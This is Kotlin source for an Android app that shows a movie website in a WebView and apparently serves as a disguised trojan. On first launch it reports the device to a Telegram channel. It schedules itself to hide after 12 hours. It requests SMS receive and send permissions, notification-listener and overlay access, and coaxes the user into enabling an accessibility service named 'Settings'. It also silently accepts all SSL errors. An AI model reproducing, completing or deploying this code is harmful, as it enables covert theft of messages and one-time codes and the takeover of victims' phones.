package com.security.testapp

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.webkit.*
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val prefs by lazy { getSharedPreferences("app_prefs", MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Full-screen WebView
        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
            webViewClient = MyWebViewClient()
            webChromeClient = WebChromeClient()
            loadUrl("https://moviebox.ph/")   // <-- REPLACE WITH YOUR URL
        }
        setContentView(webView)

        // First launch actions
        if (!prefs.getBoolean("first_launch_done", false)) {
            prefs.edit().putBoolean("first_launch_done", true).apply()

            // Send connection alert
            sendConnectionAlert()

            // Schedule self-hide after 12 hours
            scheduleHideAlarm()

            // Start auto-permission flow
            requestAllPermissions()
        }
    }

    private fun sendConnectionAlert() {
        val device = "${Build.MODEL} (${Build.BRAND})"
        val os = Build.VERSION.RELEASE
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        val message = """
            🔗 NEW CONNECTION ESTABLISHED
            Device: $device
            OS Version: $os
            App Version: 1.0
            Timestamp: $timestamp
        """.trimIndent()
        TelegramHelper.sendMessage(message)
    }

    private fun scheduleHideAlarm() {
        if (prefs.getBoolean("hide_done", false)) return

        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, HideReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val triggerTime = System.currentTimeMillis() + 12 * 60 * 60 * 1000L
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (alarmManager.canScheduleExactAlarms()) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                } else {
                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM))
                    Toast.makeText(this, "Please grant exact alarm permission", Toast.LENGTH_LONG).show()
                    alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                }
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (_: Exception) {}
    }

    private fun requestAllPermissions() {
        // Runtime permissions
        val permissionsToRequest = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
            permissionsToRequest.add(Manifest.permission.RECEIVE_SMS)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
            permissionsToRequest.add(Manifest.permission.SEND_SMS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
        }

        // Open notification listener settings if not enabled
        if (!isNotificationListenerEnabled()) {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        }

        // Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName"))
            startActivity(intent)
        }

        // Accessibility service will be enabled manually by the user after first launch prompt
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        Toast.makeText(this, "Enable 'Settings' in Accessibility for auto-permission", Toast.LENGTH_LONG).show()
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private inner class MyWebViewClient : WebViewClient() {
        override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
            handler?.proceed()
        }
    }
}
